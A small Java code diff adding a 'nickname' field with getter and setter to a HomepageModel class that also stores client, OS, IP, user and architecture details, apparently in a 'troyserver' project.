@@ -5,6 +5,7 @@ package ch.lebois.troyserver.model;
  **/
 public class HomepageModel {
     private String client;
+    private String nickname;
     private String os;
     private String lastseen;
     private int logcount;
@@ -12,6 +13,14 @@ public class HomepageModel {
     private String ip;
     private String pcuser;
     private String arch;
+
+    public String getNickname() {
+        return nickname;
+    }
+
+    public void setNickname(String nickname) {
+        this.nickname = nickname;
+    }
 
     public String getPcuser() {
         return pcuser;
